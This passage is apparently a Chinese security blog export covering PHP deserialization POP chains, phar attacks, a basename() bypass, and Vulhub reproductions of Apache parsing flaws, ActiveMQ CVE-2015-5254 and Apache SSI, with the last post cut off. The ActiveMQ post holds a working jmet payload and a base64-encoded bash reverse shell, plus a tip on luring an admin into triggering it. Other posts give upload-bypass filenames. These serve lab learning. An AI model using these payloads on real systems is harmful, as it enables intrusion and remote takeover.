<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。</p>
<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。</p>
<p>get方法用来获取私有成员属性的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__get()方法用来获取私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要获取成员属性的名称。</li>
</ul>
<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>此方法用来给私有成员属性赋值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__set()方法用来设置私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;$name = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要赋值的属性名。</li>
<li>$value：给属性赋值的值。</li>
</ul>
<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>这个函数是当我们对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时调用。</p>
<p>在这之前我们要先了解一下<code>isset()</code>函数的使用。<code>isset()</code>函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？</p>
<p>若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上<code>__isset()</code>方法，接下来就可以使用<code>isset()</code>在对象外面访问对象里面的私有成员了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用isset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">isset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用isset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>这个方法基本和<code>__insset</code>情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用unset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">unset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用unset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p>此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。</p>
<p>通常情况下，我们访问类的属性的时候都是<code>$实例化名称-&gt;属性名</code>这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用<code>__tostring()</code>就可以直接用echo来输出了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;age . <span class="string">'岁了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">echo</span> $ameng;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ameng3岁了</span><br></pre></td></tr></table></figure>

<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。</p>
<p>版本要求：</p>
<p>PHP &gt; 5.3.0</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'你用调用函数的方式调用了这个对象，所以我起作用了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	$ameng();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">你用调用函数的方式调用了这个对象，所以我起作用</span><br></pre></td></tr></table></figure>

<h3 id="pop链的构造"><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>寻找位点（unserialize函数—&gt;变量可控）</li>
<li>正向构造（各种方法）</li>
<li>反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）</li>
</ol>
<p>来看一个简单的例子(HECTF)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">         <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">         <span class="keyword">$this</span>-&gt;token =&amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag&#123;**********&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'chal'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $chal = unserialize($_GET[<span class="string">'chal'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要拿到flag，在<code>__invoke()</code>函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。</p>
<p>那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。</p>
<p>通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。</p>
<p>那么我们可以构造如下pop链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    ··········</span><br><span class="line">    $read = <span class="keyword">new</span> Read();</span><br><span class="line">    $show = <span class="keyword">new</span> Show();</span><br><span class="line">    $test = <span class="keyword">new</span> Test();</span><br><span class="line">	</span><br><span class="line">	$read-&gt;token = &amp;$read-&gt;token_flag;</span><br><span class="line">    $test-&gt;params = $read;</span><br><span class="line">    $show-&gt;str[<span class="string">'str'</span>] = $test;</span><br><span class="line">    $show-&gt;source = $show;</span><br><span class="line">    <span class="keyword">echo</span> serialize($show);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给个图总结一下：</p>
<p><img src="https://image.3001.net/images/20210425/16193177609106.png" alt="image-20210424041917873"></p>
<h3 id="phar与反序列化"><a href="#phar与反序列化" class="headerlink" title="phar与反序列化"></a>phar与反序列化</h3><p>简介 </p>
<p>PHAR（”PHP archive”）是PHP里类似JAR的一种打包文件，在PHP &gt; 5.3版本中默认开启。其实就是用来打包程序的。</p>
<p>文件结构 </p>
<ol>
<li><p>a stub：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>前面内容不限，后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则phar扩展无法将该文件识别为phar文件。</p>
</li>
<li><p>官方手册</p>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
</li>
</ol>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>前提：将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>off</code>，不然无法生成phar文件。</p>
<p>phar.php： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'Hello I am Ameng'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在我们访问之后，会在当前目录下生成一个phar.phar文件。</p>
<p>然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图</p>
<p><img src="https://image.3001.net/images/20210425/16193177636677.png" alt="image-20210424042041064"></p>
<p>Ameng.php </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Hello I am Ameng</span></span><br></pre></td></tr></table></figure>

<h3 id="其他一些总结"><a href="#其他一些总结" class="headerlink" title="其他一些总结"></a>其他一些总结</h3><h4 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h4><p>此函数返回路径中的文件名的一部分(后面)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。规定要检查的路径。</li>
<li>suffix：可选。规定文件的扩展名。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $path = <span class="string">"index.php/test.php"</span>;</span><br><span class="line">	<span class="keyword">echo</span> basename($path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">执行结果——&gt;</span><br><span class="line">test.php</span><br></pre></td></tr></table></figure>

<p>此函数还有一个特点，就是会去掉文件名的非ASCII码值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$path = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	print_r(basename($path));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//通过 url 传入参数`x=index.php/config.php/%ff`</span></span><br><span class="line"><span class="comment">//结果：回显config.php</span></span><br></pre></td></tr></table></figure>

<p>可以看到，<code>%ff</code>直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于<code>%ff</code>在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了<code>basename</code>函数对文件名的非ASCII值去除的特点，从而被删掉。</p>
<p>参考链接：<a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>危险函数</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 多后缀解析漏洞</title>
    <url>/2021/04/21/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><a id="more"></a>

<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>

<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p>
<p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p>
<p><img src="https://image.3001.net/images/20210420/16188726916210.png" alt="image-20201020023156918"></p>
<p><img src="https://image.3001.net/images/20210420/1618872693636.png" alt="image-20201020023237068"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2021/04/20/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个名为1.php的文件，被拦截：</p>
<p><img src="https://image.3001.net/images/20210420/16188726507583.png" alt="image-20201020020712805"></p>
<p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截：</p>
<p><img src="https://image.3001.net/images/20210420/16188726521450.png" alt="image-20201020021215126"></p>
<p>访问刚才上传的<code>/1.php%0a</code>，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
<p><img src="https://image.3001.net/images/20210420/1618872656333.png" alt="image-20201020021257808"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ反序列化漏洞（CVE-2015-5254）</title>
    <url>/2021/04/15/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><p>​    Apache ActiveMQ是由美国Pachitea（Apache）软件基金会开发的一种开源消息中间件，它支持Java消息服务，集群，Spring框架等。</p>
<p>​    Apache ActiveMQ版本5.x之前的5.13.0安全漏洞，该程序引起的漏洞并不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。</p>
<a id="more"></a>

<p>运行环境后，它将在端口61616和8161上建立两个端口。端口61616是工作端口，消息在此端口上传递。端口8161是网页管理页面端口。访问<code>http://192.168.44.132:8161</code>，您可以看到网络管理页面，但是从理论上讲该漏洞不需要网络。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>漏洞利用过程如下：</p>
<ol>
<li>生成序列化的有效负载（你可以使用ysoserial）</li>
<li>将有效载荷发送到端口61616</li>
<li>访问Web管理页面并阅读序列化消息，然后您可以触发漏洞。</li>
</ol>
<p>为了利用此环境，我们将使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>（Java消息利用工具）。首先下载jmet的jar文件，并在同一目录中创建名为<strong>external的</strong>文件夹（否则可能会出现该文件夹不存在的错误）。</p>
<p>jmet是使用ysoserial生成并发送有效载荷（jar随ysoserial一起提供，我们不需要再次下载它），因此我们需要选择一个可以在ysoserial中用作小工具的对象，例如ROME 。</p>
<p>执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188727678144.png" alt="image-20210420045506964"></p>
<p>此时，一个名为事件的队列将被添加到目标ActiveMQ。</p>
<p>您可以访问<code>http://192.168.44.132:8161/admin/browse.jsp?JMSDestination=Event</code>以查看此队列中的所有消息</p>
<p>（<strong>登录名/密码：</strong> admin / admin）：</p>
<p><img src="https://image.3001.net/images/20210420/16188727695815.png" alt="image-20210420051032493"></p>
<p>单击此消息以触发命令执行，</p>
<p><img src="https://image.3001.net/images/20210420/16188727719315.png" alt="image-20210420052010390"></p>
<p>这次进入容器<code>docker-compose exec activemq bash</code>，</p>
<p>我们可以看到/ tmp / success已成功创建，表明利用成功：</p>
<p><img src="https://image.3001.net/images/20210420/16188727754408.png" alt="image-20210420051326031"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>把反弹shell的命令进行base64编码</p>
<p><img src="https://image.3001.net/images/20210420/16188727778776.png" alt="image-20210420055255231"></p>
<p>把编码放进去。<br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}</p>
<p>最终命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188727802590.png" alt="image-20210420055630353"></p>
<p>再通过管理界面单击消息以触发命令执行，成功进入root权限</p>
<p><img src="https://image.3001.net/images/20210420/1618872782104.png" alt="image-20210420055539067"></p>
<p>值得注意的是，通过Web管理页面访问消息并触发漏洞需要管理员特权。在没有密码的情况下，我们可以诱使管理员访问我们的链接以进行触发，或者伪装成来自其他服务的合法消息需要在触发时等待客户端访问。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache SSI 远程命令执行漏洞</title>
    <url>/2021/04/13/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
<a id="more"></a>

<p>环境启动后，访问<code>http://your-ip:8080/upload.php</code>，即可看到一个上传表单。</p>
<p><img src="https://image.3001.net/images/20210420/1618872602739.png" alt="image-20201020011344884"></p>
<p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
